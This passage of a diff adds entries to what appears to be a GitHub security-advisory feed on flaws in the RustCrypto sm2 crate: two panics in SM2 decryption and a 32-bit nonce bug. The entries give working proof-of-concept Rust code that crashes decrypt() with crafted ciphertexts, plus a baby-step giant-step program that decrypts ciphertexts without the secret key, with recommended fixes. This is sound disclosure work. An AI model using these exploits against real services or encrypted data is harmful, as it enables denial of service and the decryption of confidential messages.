+            <uri>https://github.com/advisories/GHSA-hcp2-x6j4-29j7</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-01-13T15:10:03.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sm2] RustCrypto Has Insufficient Length Validation in decrypt() in SM2-PKE]]></title>
+        <id>https://github.com/advisories/GHSA-j9xq-69pf-pcm8</id>
+        <link href="https://github.com/advisories/GHSA-j9xq-69pf-pcm8"/>
+        <updated>2026-01-13T15:02:24.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A denial-of-service vulnerability exists in the SM2 public-key encryption (PKE) implementation: the <code>decrypt()</code> path performs unchecked <code>slice::split_at</code> operations on input buffers derived from untrusted ciphertext. An attacker can submit short/undersized ciphertext or carefully-crafted DER-encoded structures to trigger bounds-check panics (Rust unwinding) which crash the calling thread or process.</p>
+<h3 id="affected-component--versions">Affected Component / Versions</h3>
+<ul>
+<li><p>File: <code>src/pke/decrypting.rs</code></p>
+</li>
+<li><p>Functions: <code>DecryptingKey::decrypt_digest/decrypt/decrypt_der</code>, internal <code>decrypt()</code> implementation</p>
+</li>
+<li><p>Affected releases: </p>
+<ul>
+<li>sm2 0.14.0-rc.0 (<a href="https://crates.io/crates/sm2/0.14.0-rc.0">https://crates.io/crates/sm2/0.14.0-rc.0</a>)</li>
+<li>sm2 0.14.0-pre.0 (<a href="https://crates.io/crates/sm2/0.14.0-pre.0">https://crates.io/crates/sm2/0.14.0-pre.0</a>)</li>
+</ul>
+</li>
+</ul>
+<h3 id="details">Details</h3>
+<p>The vulnerability is located in the file <code>sm2/src/pke/decrypting.rs</code>. The <strong>fundamental cause</strong> of the vulnerability is that the decryption function <strong>does not strictly check</strong> the ciphertext's format and length information. Consequently, a maliciously crafted ciphertext can trigger Rust's <strong>panic mechanism</strong> instead of the expected error handling (<code>Error</code>) mechanism. The Rust function <code>C.split_at(L)</code> will trigger a Panic if the length is less than <code>L</code>, as shown in the code comment below: the <code>decrypting</code> function has <strong>at least three locations</strong> where a slice operation might trigger a Panic.</p>
+<pre><code class="language-rust">fn decrypt(
+    secret_scalar: &amp;Scalar,
+    mode: Mode,
+    hasher: &amp;mut dyn DynDigest,
+    cipher: &amp;[u8],
+) -&gt; Result&lt;Vec&lt;u8&gt;&gt; {
+    let q = U256::from_be_hex(FieldElement::MODULUS);
+    let c1_len = q.bits().div_ceil(8) * 2 + 1;  // Typically 65 for SM2
+
+    // B1: get 𝐶1 from 𝐶
+    let (c1, c) = cipher.split_at(c1_len as usize);  // PANIC HERE if cipher.len() &lt; 65
+    let encoded_c1 = EncodedPoint::from_bytes(c1).map_err(Error::from)?;
+
+    // ... (lines 170-178 omitted)
+
+    let digest_size = hasher.output_size();  // Typically 32 for SM3
+    let (c2, c3) = match mode {
+        Mode::C1C3C2 =&gt; {
+            let (c3, c2) = c.split_at(digest_size);  // PANIC HERE if c.len() &lt; 32
+            (c2, c3)
+        }
+        Mode::C1C2C3 =&gt; c.split_at(c.len() - digest_size),  // PANIC HERE if c.len() &lt; 32
+    };
+</code></pre>
+<p>Rust's <code>slice::split_at</code> panics when the split index is greater than the slice length. A panic in library code typically unwinds the thread and can crash an application if not explicitly caught. This means an attacker that can submit ciphertexts to a service using this library may cause a DoS.</p>
+<h3 id="proof-of-concept-poc">Proof of Concept (PoC)</h3>
+<p>Two PoCs were added to this repository under <code>examples/</code> demonstrating the two
+common ways to trigger the issue:</p>
+<ul>
+<li><p><code>examples/poc_short_ciphertext.rs</code> — constructs a deliberately undersized
+ciphertext (e.g., <code>vec![0u8; 10]</code>) and passes it to <code>DecryptingKey::decrypt</code>.
+This triggers the <code>cipher.split_at(c1_len)</code> panic.</p>
+<pre><code class="language-rust">//! PoC: trigger panic in SM2 decryption by supplying a ciphertext that is shorter
+//! than the expected C1 length so that `cipher.split_at(c1_len)` panics.
+//!
+//! Usage:
+//!   cargo run --example poc_short_ciphertext
+
+use rand_core::OsRng;
+
+use sm2::pke::DecryptingKey;
+use sm2::SecretKey;
+
+fn main() {
+    // Generate a normal secret key and DecryptingKey instance.
+    let mut rng = OsRng;
+    let sk = SecretKey::try_from_rng(&amp;mut rng).expect("failed to generate secret key");
+    let dk = DecryptingKey::new(sk);
+
+    // to trigger the vulnerability in `decrypt()` where it does `cipher.split_at(c1_len)`.
+    let short_ciphertext = vec![0u8; 10]; // deliberately too short
+
+    println!("Calling decrypt with undersized ciphertext (len = {})...", short_ciphertext.len());
+
+    // The panic is the PoC for the lack of length validation.
+    let _ = dk.decrypt(&amp;short_ciphertext);
+
+    // If the library were robust, this line would be reached and decrypt would return Err.
+    println!("decrypt returned (unexpected) - PoC did not panic");
+}
+</code></pre>
+</li>
+<li><p><code>examples/poc_der_short.rs</code> — constructs an ASN.1 <code>Cipher</code> structure with
+valid-length <code>x</code>/<code>y</code> coordinates (from a generated public key) but with tiny
+<code>digest</code> and <code>cipher</code> OCTET STRING fields (1 byte each). When run with the
+crate built with <code>--features std</code>, <code>Cipher::from_der</code> accepts the DER and the
+call flows into <code>decrypt()</code>, which then panics on the later <code>split_at</code>.</p>
+<pre><code class="language-rust">//! Usage:
+//!   RUST_BACKTRACE=1 cargo run --example poc_der_short --features std
+
+use rand_core::OsRng;
+use sm2::SecretKey;
+use sm2::pke::DecryptingKey;
+
+fn build_der(x: &amp;[u8], y: &amp;[u8], digest: &amp;[u8], cipher: &amp;[u8]) -&gt; Vec&lt;u8&gt; {
+    // Build SEQUENCE { INTEGER x, INTEGER y, OCTET STRING digest, OCTET STRING cipher }
+    let mut body = Vec::new();
+
+    // INTEGER x
+    body.push(0x02);
+    body.push(x.len() as u8);
+    body.extend_from_slice(x);
+
+    // INTEGER y
+    body.push(0x02);
+    body.push(y.len() as u8);
+    body.extend_from_slice(y);
+
+    // OCTET STRING digest (intentionally tiny)
+    body.push(0x04);
+    body.push(digest.len() as u8);
+    body.extend_from_slice(digest);
+
+    // OCTET STRING cipher (intentionally tiny)
+    body.push(0x04);
+    body.push(cipher.len() as u8);
+    body.extend_from_slice(cipher);
+
+    // SEQUENCE header
+    let mut der = Vec::new();
+    der.push(0x30);
+    der.push(body.len() as u8);
+    der.extend(body);
+    der
+}
+
+fn main() {
+    let mut rng = OsRng;
+    let sk = SecretKey::try_from_rng(&amp;mut rng).expect("failed to generate secret key");
+    // Extract recipient public key coordinates before moving the secret key into DecryptingKey
+    let pk = sk.public_key();
+    let dk = DecryptingKey::new(sk);
+    // get SEC1 encoding 0x04 || X || Y and slice out X and Y
+    let sec1 = pk.to_sec1_bytes();
+    let sec1_ref: &amp;[u8] = sec1.as_ref();
+    let x = &amp;sec1_ref[1..33];
+    let y = &amp;sec1_ref[33..65];
+    // Very small digest and cipher to trigger length-based panics inside decrypt()
+    let digest = [0x33u8; 1];
+    let cipher = [0x44u8; 1];
+
+    let der = build_der(x, y, &amp;digest, &amp;cipher);
+
+    println!("Calling decrypt_der with crafted short DER (len={})...", der.len());
+
+    // Expected to panic inside decrypt() due to missing length checks when splitting
+    let _ = dk.decrypt_der(&amp;der);
+
+    println!("decrypt_der returned (unexpected) - PoC did not panic");
+}
+</code></pre>
+</li>
+</ul>
+<p>Reproduction (from repository root):</p>
+<pre><code class="language-bash"># PoC that directly uses decrypt on a short buffer
+cargo run --example poc_short_ciphertext --features std
+
+# PoC that passes a short DER to decrypt_der
+RUST_BACKTRACE=1 cargo run --example poc_der_short --features std
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Direct Denial of Service: remote untrusted input can crash the thread/process handling decryption.</li>
+<li>Low attacker effort: crafting short inputs or small DER octet strings is trivial.</li>
+<li>Wide exposure: any application that exposes decryption endpoints and links this library is at risk.</li>
+</ul>
+<h3 id="recommended-fix">Recommended Fix</h3>
+<p>Perform defensive length checks before any <code>split_at</code> usage and return a controlled <code>Err</code> instead of allowing a panic. Minimal fixes in <code>decrypt()</code>:</p>
+<pre><code class="language-rust">let c1_len_usize = c1_len as usize;
+if cipher.len() &lt; c1_len_usize {
+    return Err(Error);
+}
+let (c1, c) = cipher.split_at(c1_len_usize);
+
+let digest_size = hasher.output_size();
+if c.len() &lt; digest_size {
+    return Err(Error);
+}
+let (c2, c3) = match mode {
+    Mode::C1C3C2 =&gt; {
+        let (c3, c2) = c.split_at(digest_size);
+        (c2, c3)
+    }
+    Mode::C1C2C3 =&gt; c.split_at(c.len() - digest_size),
+};
+</code></pre>
+<p>After applying these checks, <code>decrypt()</code> will return an error for short or malformed inputs instead of panicking.</p>
+<h3 id="credit"><strong>Credit</strong></h3>
+<p>This vulnerability was discovered by:</p>
+<ul>
+<li><p>XlabAI Team of Tencent Xuanwu Lab</p>
+</li>
+<li><p>Atuin Automated Vulnerability Discovery Engine</p>
+</li>
+</ul>
+<p>CVE and credit are preferred.</p>
+<p>If you have any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
+<h3 id="note"><strong>Note</strong></h3>
+<p>We follow the security industry standard disclosure policy—the 90+30 policy (reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, we reserve the right to publicly disclose all information about the issues after this timeframe.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-j9xq-69pf-pcm8">https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-j9xq-69pf-pcm8</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22700">https://nvd.nist.gov/vuln/detail/CVE-2026-22700</a></li>
+<li><a href="https://github.com/RustCrypto/elliptic-curves/pull/1603">https://github.com/RustCrypto/elliptic-curves/pull/1603</a></li>
+<li><a href="https://github.com/RustCrypto/elliptic-curves/commit/e60e99167a9a2b187ebe80c994c5204b0fdaf4ab">https://github.com/RustCrypto/elliptic-curves/commit/e60e99167a9a2b187ebe80c994c5204b0fdaf4ab</a></li>
+<li><a href="https://github.com/advisories/GHSA-j9xq-69pf-pcm8">https://github.com/advisories/GHSA-j9xq-69pf-pcm8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j9xq-69pf-pcm8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-01-13T15:02:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sm2] SM2-PKE has Unchecked AffinePoint Decoding (unwrap) in decrypt()]]></title>
+        <id>https://github.com/advisories/GHSA-78p6-6878-8mj6</id>
+        <link href="https://github.com/advisories/GHSA-78p6-6878-8mj6"/>
+        <updated>2026-01-11T14:56:41.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A denial-of-service vulnerability exists in the SM2 PKE decryption path where an invalid elliptic-curve point (C1) is decoded and the resulting value is unwrapped without checking. Specifically, <code>AffinePoint::from_encoded_point(&amp;encoded_c1)</code> may return a <code>None</code>/<code>CtOption::None</code> when the supplied coordinates are syntactically valid but do not lie on the SM2 curve. The calling code previously used <code>.unwrap()</code>, causing a panic when presented with such input.</p>
+<h3 id="affected-component--versions">Affected Component / Versions</h3>
+<ul>
+<li><p>File: <code>src/pke/decrypting.rs</code></p>
+</li>
+<li><p>Function: internal <code>decrypt()</code> (invoked by <code>DecryptingKey::decrypt*</code> methods)</p>
+</li>
+<li><p>Affected releases: </p>
+<ul>
+<li>sm2 0.14.0-rc.0 (<a href="https://crates.io/crates/sm2/0.14.0-rc.0">https://crates.io/crates/sm2/0.14.0-rc.0</a>)</li>
+<li>sm2 0.14.0-pre.0 (<a href="https://crates.io/crates/sm2/0.14.0-pre.0">https://crates.io/crates/sm2/0.14.0-pre.0</a>)</li>
+</ul>
+</li>
+</ul>
+<h3 id="details">Details</h3>
+<p>The library decodes the C1 field (an EC point) as an <code>EncodedPoint</code> and then converts it to an <code>AffinePoint</code> using <code>AffinePoint::from_encoded_point(&amp;encoded_c1)</code>. That conversion returns a <code>CtOption&lt;AffinePoint&gt;</code> (or an <code>Option</code> equivalent) which will indicate failure when the coordinates do not satisfy the curve equation. The code then called <code>.unwrap()</code> on that result, causing a panic when
+<code>None</code> was returned. Because <code>EncodedPoint::from_bytes()</code> only validates format (length and SEC1
+encoding) and not mathematical validity, an attacker can craft <code>C1 = 0x04 || X || Y</code> with X and Y of the right length that nonetheless do not satisfy the curve. Such inputs will pass the format check but trigger <code>from_encoded_point()</code> failure and therefore panic on <code>.unwrap()</code>.</p>
+<h3 id="proof-of-concept-poc">Proof of Concept (PoC)</h3>
+<p><code>examples/poc_der_invalid_point.rs</code> constructs an ASN.1 DER <code>Cipher</code> structure
+with <code>x</code> and <code>y</code> set to arbitrary 32-byte values (e.g., repeating 0x11 and 0x22),
+and passes it to <code>DecryptingKey::decrypt_der</code>. With the vulnerable code, this
+produces a panic originating at the <code>unwrap()</code> call in <code>decrypt()</code>. Other APIs such as <code>DecryptingKey::decrypt</code> also produce a panic with invalid C1 point.</p>
+<pre><code class="language-rust">//! PoC: trigger invalid-point panic via `decrypt_der` by providing ASN.1 DER
+//! where x/y are valid-length integers but do not lie on the curve.
+//!
+//! Usage:
+//!   RUST_BACKTRACE=1 cargo run --example poc_der_invalid_point
+
+use rand_core::OsRng;
+use sm2::SecretKey;
+use sm2::pke::DecryptingKey;
+
+fn build_der(x: &amp;[u8], y: &amp;[u8], digest: &amp;[u8], cipher: &amp;[u8]) -&gt; Vec&lt;u8&gt; {
+    // Build SEQUENCE { INTEGER x, INTEGER y, OCTET STRING digest, OCTET STRING cipher }
+    let mut body = Vec::new();
+
+    // INTEGER x
+    body.push(0x02);
+    body.push(x.len() as u8);
+    body.extend_from_slice(x);
+
+    // INTEGER y
+    body.push(0x02);
+    body.push(y.len() as u8);
+    body.extend_from_slice(y);
+
+    // OCTET STRING digest
+    body.push(0x04);
+    body.push(digest.len() as u8);
+    body.extend_from_slice(digest);
+
+    // OCTET STRING cipher
+    body.push(0x04);
+    body.push(cipher.len() as u8);
+    body.extend_from_slice(cipher);
+
+    // SEQUENCE header
+    let mut der = Vec::new();
+    der.push(0x30);
+    der.push(body.len() as u8);
+    der.extend(body);
+    der
+}
+
+fn main() {
+    let mut rng = OsRng;
+    let sk = SecretKey::try_from_rng(&amp;mut rng).expect("failed to generate secret key");
+    let dk = DecryptingKey::new(sk);
+
+    // x/y are 32-byte values that almost certainly are NOT on the curve
+    let x = [0x11u8; 32];
+    let y = [0x22u8; 32];
+    let digest = [0x33u8; 32];
+    let cipher = [0x44u8; 16];
+
+    let der = build_der(&amp;x, &amp;y, &amp;digest, &amp;cipher);
+
+    println!("Calling decrypt_der with DER (len={})...", der.len());
+
+    // Expected to panic in decrypt() when validating the point (from_encoded_point().unwrap())
+    let _ = dk.decrypt_der(&amp;der);
+
+    println!("decrypt_der returned (unexpected) - PoC did not panic");
+}
+</code></pre>
+<p>Run locally:</p>
+<pre><code class="language-bash">RUST_BACKTRACE=1 cargo run --example poc_der_invalid_point --features std
+</code></pre>
+<p>The process will panic with a backtrace pointing to <code>src/pke/decrypting.rs</code> at the <code>from_encoded_point(...).unwrap()</code> call.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Denial of Service: an attacker who can submit ciphertext (or DER ciphertext)
+can crash the decrypting thread/process.</li>
+<li>Low attacker effort: crafting random 32-byte X/Y values that are not on the
+curve is trivial.</li>
+<li>Wide exposure: any service that accepts ciphertext and links this library is
+vulnerable.</li>
+</ul>
+<h3 id="recommended-fix">Recommended Fix</h3>
+<p>Do not call <code>.unwrap()</code> on the result of <code>AffinePoint::from_encoded_point()</code>.
+Instead, convert the <code>CtOption</code> to an <code>Option</code> (or inspect it) and return a
+library <code>Err</code> for invalid points. Example minimal fix:</p>
+<pre><code class="language-rust">    // Return an error instead of panicking when the provided point is not on the curve.
+    let mut c1_point: AffinePoint = match AffinePoint::from_encoded_point(&amp;encoded_c1).into() {
+        Some(p) =&gt; p,
+        None =&gt; return Err(Error),
+    };
+</code></pre>
+<p>This ensures <code>decrypt()</code> returns a controlled error for invalid or malformed points instead of panicking.</p>
+<h3 id="credit"><strong>Credit</strong></h3>
+<p>This vulnerability was discovered by:</p>
+<ul>
+<li><p>XlabAI Team of Tencent Xuanwu Lab</p>
+</li>
+<li><p>Atuin Automated Vulnerability Discovery Engine</p>
+</li>
+</ul>
+<p>CVE and credit are preferred.</p>
+<p>If developers have any questions regarding the vulnerability details, please feel free to reach for further discussion via email at <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
+<h3 id="note"><strong>Note</strong></h3>
+<p>This organization follows the security industry standard disclosure policy—the 90+30 policy (reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, we reserve the right to publicly disclose all information about the issues after this timeframe.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-78p6-6878-8mj6">https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-78p6-6878-8mj6</a></li>
+<li><a href="https://github.com/RustCrypto/elliptic-curves/pull/1602">https://github.com/RustCrypto/elliptic-curves/pull/1602</a></li>
+<li><a href="https://github.com/RustCrypto/elliptic-curves/commit/085b7bee647029bd189e1375203418205006bcab">https://github.com/RustCrypto/elliptic-curves/commit/085b7bee647029bd189e1375203418205006bcab</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22699">https://nvd.nist.gov/vuln/detail/CVE-2026-22699</a></li>
+<li><a href="https://github.com/advisories/GHSA-78p6-6878-8mj6">https://github.com/advisories/GHSA-78p6-6878-8mj6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-78p6-6878-8mj6</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-01-09T22:35:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sm2] SM2-PKE has 32-bit Biased Nonce Vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-w3g8-fp6j-wvqw</id>
+        <link href="https://github.com/advisories/GHSA-w3g8-fp6j-wvqw"/>
+        <updated>2026-01-11T14:56:34.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A critical vulnerability exists in the SM2 Public Key Encryption (PKE) implementation where the ephemeral nonce <code>k</code> is generated with severely reduced entropy. A unit mismatch error causes the nonce generation function to request only 32 bits of randomness instead of the expected 256 bits. This reduces the security of the encryption from a 128-bit level to a trivial 16-bit level, allowing a practical attack to recover the nonce <code>k</code> and decrypt any ciphertext <strong>given only the public key and ciphertext</strong>.</p>
+<h3 id="affected-versions">Affected Versions</h3>
+<ul>
+<li>sm2 0.14.0-rc.0 (<a href="https://crates.io/crates/sm2/0.14.0-rc.0">https://crates.io/crates/sm2/0.14.0-rc.0</a>)</li>
+<li>sm2 0.14.0-pre.0 (<a href="https://crates.io/crates/sm2/0.14.0-pre.0">https://crates.io/crates/sm2/0.14.0-pre.0</a>)</li>
+</ul>
+<p>This vulnerability is introduced in commit: <a href="https://github.com/RustCrypto/elliptic-curves/commit/4781762f23ff22ab34763410f648128055c93731">Commit 4781762</a> on Sep 6, 2024, which is over a year ago.</p>
+<h3 id="details">Details</h3>
+<p>The root cause of this vulnerability is a unit mismatch in the <code>encrypt</code> function located in <code>sm2/src/pke/encrypting.rs</code>.</p>
+<ol>
+<li>The code correctly calculates the byte-length of the curve order (256 bits / 8 = 32 bytes) and stores it in a constant <code>N_BYTES</code>.<pre><code class="language-rust">const N_BYTES: u32 = Sm2::ORDER.as_ref().bits().div_ceil(8); // Value is 32 (bytes)
+</code></pre>
+</li>
+<li>However, this <code>N_BYTES</code> value is then passed to the <code>next_k</code> helper function, which incorrectly interprets this value as a <em>bit length</em>.<pre><code class="language-rust">let k = Scalar::from_uint(&amp;next_k(rng, N_BYTES)?).unwrap();
+</code></pre>
+</li>
+<li>Inside <code>next_k</code>, the <code>bit_length</code> parameter (which holds the value 32) is passed directly to <code>U256::try_random_bits</code>, a function that generates a random number with the specified number of bits.<pre><code class="language-rust">fn next_k&lt;R: TryCryptoRng + ?Sized&gt;(rng: &amp;mut R, bit_length: u32) -&gt; Result&lt;U256&gt; {
+    let k = U256::try_random_bits(rng, bit_length).map_err(|_| Error)?;
+    // ...
+}
+</code></pre>
+As a result, the ephemeral nonce <code>k</code> is generated with only 32 bits of entropy, with its upper 224 bits being zero. This catastrophic loss of randomness makes the encryption scheme insecure.</li>
+</ol>
+<h3 id="poc">PoC</h3>
+<p>A proof-of-concept demonstrating the feasibility of this attack is provided in <code>examples/bsgs_recover.rs</code>. The PoC performs the following steps:</p>
+<ol>
+<li><strong>Encrypt a Message</strong>: It uses the vulnerable <code>EncryptingKey::encrypt</code> function to encrypt a sample message.</li>
+<li><strong>Extract Ephemeral Public Key</strong>: It parses the ciphertext to extract <code>C1</code>, which is the ephemeral public key <code>[k]G</code>.</li>
+<li><strong>Recover Nonce <code>k</code></strong>: It runs a Baby-Step Giant-Step (BSGS) algorithm to search the reduced 2^32 search space for the nonce <code>k</code>. This attack is computationally feasible on modern hardware in seconds with time complexity <code>O(2^16)</code>.</li>
+<li><strong>Decrypt without Secret Key</strong>: Once <code>k</code> is recovered, it computes the shared secret <code>[k]PB</code> (where <code>PB</code> is the recipient's public key) and successfully decrypts the ciphertext without access to the recipient's secret key.</li>
+</ol>
+<p><code>examples/bsgs_recover.rs</code></p>
+<pre><code class="language-rust">//! Example: Recover low-entropy nonce k via Baby-Step Giant-Step (BSGS)
+//!
+//! This example intentionally demonstrates an attack on the vulnerable
+//! `EncryptingKey::encrypt` implementation which (in the current repository
+//! state) may generate k with only 32 bits of entropy. The example:
+//! - Generates a key pair and encrypts a short plaintext.
+//! - Extracts C1 from the ciphertext (ephemeral public key [k]G).
+//! - Runs BSGS over the reduced search space 2^32 to recover k and decrypt: time O(2^16), space O(2^16).
+//!
+
+use std::collections::HashMap;
+use std::error::Error;
+
+use rand_core::OsRng;
+
+use sm2::{
+    pke::Mode,
+    pke::EncryptingKey,
+    PublicKey,
+    SecretKey,
+    AffinePoint,
+    ProjectivePoint,
+    Scalar,
+};
+use elliptic_curve::bigint::U256;
+use elliptic_curve::{Group, Curve};
+use elliptic_curve::sec1::{FromEncodedPoint, ToEncodedPoint};
+use sm3::{Sm3, Digest};
+
+/// Baby-step giant-step over the 32-bit search space.
+fn bsgs_recover_k(c1: &amp;AffinePoint) -&gt; Option&lt;U256&gt; {
+    // search parameters
+    let m: u32 = 1 &lt;&lt; 16; // baby/giant step size -&gt; covers 2^32 space
+
+    // baby steps: j*G -&gt; j
+    let mut baby: HashMap&lt;Vec&lt;u8&gt;, u32&gt; = HashMap::with_capacity(m as usize + 1);
+    for j in 0..m {
+        let j_u256 = U256::from_u32(j);
+        let s = Scalar::from_uint(&amp;j_u256).unwrap();
+        let p = ProjectivePoint::mul_by_generator(&amp;s).to_affine();
+        let ep = p.to_encoded_point(false);
+        baby.insert(ep.as_bytes().to_vec(), j);
+    }
+
+    // giant steps
+    for i in 0..=m {
+        let im = (i as u64) * (m as u64);
+        let im_u256 = U256::from_u64(im);
+        let im_scalar = Scalar::from_uint(&amp;im_u256).unwrap();
+        let im_point = ProjectivePoint::mul_by_generator(&amp;im_scalar).to_affine();
+
+        // candidate = C1 - im_point
+        let c1_proj = ProjectivePoint::from(c1);
+        let im_proj = ProjectivePoint::from(&amp;im_point);
+        let candidate_proj = c1_proj + (-im_proj);
+        let candidate = candidate_proj.to_affine();
+        let cand_bytes = candidate.to_encoded_point(false).as_bytes().to_vec();
+
+        if let Some(&amp;j) = baby.get(&amp;cand_bytes) {
+            let k_recovered = im + (j as u64);
+            return Some(U256::from_u64(k_recovered));
+        }
+    }
+    None
+}
+
+/// KDF using SM3 (re-implementation of crate internal `kdf`).
+fn kdf_sm3(kpb: AffinePoint, c2: &amp;mut [u8]) {
+    let mut hasher = Sm3::new();
+    let klen = c2.len();
+    let mut ct: u32 = 0x00000001;
+    let digest_size = 32usize; // SM3 output is 32 bytes
+    let mut ha = vec![0u8; digest_size];
+    let encode_point = kpb.to_encoded_point(false);
+
+    let mut offset = 0usize;
+    while offset &lt; klen {
+        hasher.update(encode_point.x().unwrap());
+        hasher.update(encode_point.y().unwrap());
+        hasher.update(&amp;ct.to_be_bytes());
+        let out = hasher.finalize_reset();
+        ha.copy_from_slice(out.as_slice());
+
+        let xor_len = core::cmp::min(digest_size, klen - offset);
+        for i in 0..xor_len {
+            c2[offset + i] ^= ha[i];
+        }
+        offset += xor_len;
+        ct = ct.wrapping_add(1);
+    }
+}
+
+/// Decrypt ciphertext given recovered k and recipient public key (without secret key).
+fn decrypt_with_k(pubkey: &amp;PublicKey, k: U256, ciphertext: &amp;[u8], mode: Mode) -&gt; Result&lt;Vec&lt;u8&gt;, Box&lt;dyn Error&gt;&gt; {
+    // parse c1
+    let n_bytes = sm2::Sm2::ORDER.as_ref().bits().div_ceil(8) as usize; // 32
+    let c1_len = n_bytes * 2 + 1;
+    if ciphertext.len() &lt; c1_len {
+        return Err("ciphertext too short".into());
+    }
+    let (_c1_bytes, rest) = ciphertext.split_at(c1_len);
+
+    // derive shared point hpb = [h*k]PB; for SM2 cofactor h == 1 so this is [k]PB
+    let pb_affine = pubkey.as_affine();
+    let k_scalar = Scalar::from_uint(&amp;k).unwrap();
+    let s = *pb_affine; // cofactor h == 1
+    let hpb = (s * k_scalar).to_affine();
+
+    // split rest into c2 and c3 depending on mode
+    let digest_size = 32usize; // SM3 output size
+    let (c2_slice, c3_slice) = match mode {
+        Mode::C1C2C3 =&gt; {
+            let c2_len = rest.len() - digest_size;
+            rest.split_at(c2_len)
+        }
+        Mode::C1C3C2 =&gt; {
+            let (c3, c2) = rest.split_at(digest_size);
+            (c2, c3)
+        }
+    };
+
+    let mut c2 = c2_slice.to_owned();
+    // KDF to recover plaintext
+    kdf_sm3(hpb, &amp;mut c2);
+
+    // verify c3
+    let mut check = Sm3::new();
+    let enc = hpb.to_encoded_point(false);
+    check.update(enc.x().unwrap());
+    check.update(&amp;c2);
+    check.update(enc.y().unwrap());
+    let out = check.finalize_reset();
+    if out.as_slice() != c3_slice {
+        return Err("c3 verification failed".into());
+    }
+
+    Ok(c2)
+}
+
+/// High-level: given ciphertext and recipient public key, recover k via BSGS and decrypt.
+fn recover_and_decrypt(pubkey: &amp;PublicKey, ciphertext: &amp;[u8], mode: Mode) -&gt; Result&lt;Vec&lt;u8&gt;, Box&lt;dyn Error&gt;&gt; {
+    // extract C1
+    let n_bytes = sm2::Sm2::ORDER.as_ref().bits().div_ceil(8) as usize; // 32
+    let c1_len = n_bytes * 2 + 1;
+    let (c1_bytes, _rest) = ciphertext.split_at(c1_len);
+    let encoded = sm2::EncodedPoint::from_bytes(c1_bytes)?;
+    let c1_affine = AffinePoint::from_encoded_point(&amp;encoded).unwrap();
+
+    if let Some(k) = bsgs_recover_k(&amp;c1_affine) {
+        println!("recovered k = 0x{:x}", k);
+        let plain = decrypt_with_k(pubkey, k, ciphertext, mode)?;
+        return Ok(plain);
+    }
+    Err("failed to recover k".into())
+}
+
+fn main() -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {
+    // demo: generate keypair, encrypt, then recover and decrypt without secret key
+    let mut rng = OsRng;
+    let sk = SecretKey::try_from_rng(&amp;mut rng)?;
+    let pk = sk.public_key();
+    let ek = EncryptingKey::new_with_mode(pk, Mode::C1C2C3);
+    let msg = b"attack-demo-sm2-bsgs-recover-example";
+    let ct = ek.encrypt(&amp;mut rng, msg)?;
+    print!("Trying to recover k and decrypt...\n");
+    let recovered = recover_and_decrypt(&amp;pk, &amp;ct, Mode::C1C2C3)?;
+    println!("recovered plaintext: {}", std::str::from_utf8(&amp;recovered)?);
+    Ok(())
+}
+</code></pre>
+<p>To run the PoC (tested on Apple M3): </p>
+<pre><code class="language-bash">$ time cargo run --example bsgs_recover 
+Trying to recover k and decrypt...
+recovered k = 0x00000000000000000000000000000000000000000000000000000000ca4f2d79
+recovered plaintext: attack-demo-sm2-bsgs-recover-example
+cargo run --example bsgs_recover  14.44s user 0.13s system 89% cpu 16.266 total
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability leads to a complete loss of confidentiality for all data encrypted using the SM2 PKE implementation in this library. Any attacker who obtains a ciphertext can recover the plaintext in a feasible amount of time (several seconds).</p>
+<p>The severity is <strong>Critical</strong>, as it breaks the core security promise of the public key encryption scheme. All versions of the <code>sm2</code> crate with the vulnerable PKE implementation are affected. </p>
+<ul>
+<li><p>Fix 1: Modify the input parameter to the correct 256 bits</p>
+<pre><code class="language-rust">let k_uint = next_k(rng, N_BYTES * 8)?;
+</code></pre>
+</li>
+<li><p>Fix 2: We believe that the <code>next_k</code> function should only generate a 256-bit nonce to ensure security, therefore the parameter is unnecessary.</p>
+<pre><code class="language-rust">fn next_k&lt;R: TryCryptoRng + ?Sized&gt;(rng: &amp;mut R) -&gt; Result&lt;U256&gt; {
+    loop {
+        let k = U256::try_random_bits(rng, 256).map_err(|_| Error)?;
+        if !bool::from(k.is_zero()) &amp;&amp; k &lt; *Sm2::ORDER {
+            return Ok(k);
+        }
+    }
+}
+</code></pre>
+</li>
+</ul>
+<h3 id="credit">Credit</h3>
